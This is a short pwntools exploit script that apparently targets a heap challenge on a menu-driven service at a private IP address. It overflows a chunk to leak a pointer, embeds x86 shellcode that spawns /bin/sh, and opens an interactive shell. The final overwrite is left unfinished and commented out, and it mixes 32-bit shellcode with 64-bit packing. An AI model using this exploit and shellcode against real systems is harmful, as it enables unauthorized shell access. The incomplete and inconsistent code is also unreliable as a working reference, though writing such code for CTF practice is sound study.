from pwn import *

def Leave(size,buf):
    r.sendlineafter(">> ","L")
    r.sendlineafter(": ",str(size))
    r.sendafter(": ",buf)

def Remove(idx):
    r.sendlineafter(">> ","R")
    r.sendlineafter(": ",str(idx))

def Change(idx,buf):
    r.sendlineafter(">> ","C")
    r.sendlineafter(": ",str(idx))
    r.sendlineafter(": ",str(len(buf)))
    r.sendafter(": ",buf)

def View(idx):
    r.sendlineafter(">> ","V")
    r.sendlineafter(": ",str(idx))
    K = r.recvuntil("\n")[:-1]
    return K

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r = remote("192.168.146.128", 9623)
Leave(32,"asdf")
Leave(32,"asdf")
Change(0,"A"*0x37+"B")
K = View(0)
K = u64(K[K.find("AB")+2:]+"\x00"*(8 - (len(K)-K.find("AB")-2)))-0x78
log.info(hex(K))
payload = "A"
#Change(0,shellcode+"A"*(0x30-len(shellcode))+p64(0x49)+p64()


r.interactive()
